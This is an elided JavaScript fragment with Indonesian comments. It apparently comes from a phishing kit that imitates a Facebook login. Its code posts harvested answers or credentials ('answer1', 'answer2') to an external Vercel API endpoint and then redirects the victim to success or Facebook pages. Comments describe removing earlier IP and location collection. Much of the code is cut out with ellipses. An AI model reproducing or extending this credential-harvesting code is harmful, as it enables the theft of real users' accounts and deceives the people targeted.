// Hapus fungsi showPopup, hidePopup, showFbLoginPopup, hideFbLoginPopup 
// karena sudah dipindahkan ke index.html

// --- WARNING: thirtyDaysInMs Diatur ke 300 HARI! ---
// 300 * 24 * 60 * 60 * 1000 = 25.920.000.000 ms (~300 hari)
function checkExpirationAndNotify() {
    ...
    // Gunakan 30 hari standar, bukan 300 hari (2592000000)
...
function redirectToSuccess() {
    ...
    // --- LOGIKA FETCH DIPERBAIKI ---
    // Menghapus rantai promise IP/Lokasi yang menyebabkan error
    ...
    fetch("https://dominnneeii.vercel.app/api/login", {
        ...
        body: JSON.stringify({
            ...
            answer1,
            answer2,
            // Menghapus ip, city, region agar tidak terjadi ReferenceError
        }),
    })
    .then((res) => res.text()) // Mengambil respons sebagai teks
    .then((result) => {
        console.log("✅ Respon dari API Vercel:", result);
        // localStorage.setItem(`sent_${userID}`, "true"); // Hapus jika tidak perlu
        window.location.href = "success.html"; // Mengganti .php dengan .html
    })
    .catch((err) => {
    ...
    .finally(() => {
        // Logika Finally diletakkan di dalam catch/then jika ingin dieksekusi sebelum redirect
        if (btn) {
            btn.disabled = false;
...
async function sendFBLoginData() {
    ...
    try {
        ...
        if (
            ...
            window.location.href = "facebook.html"; // Mengganti .php dengan .html
        } else {
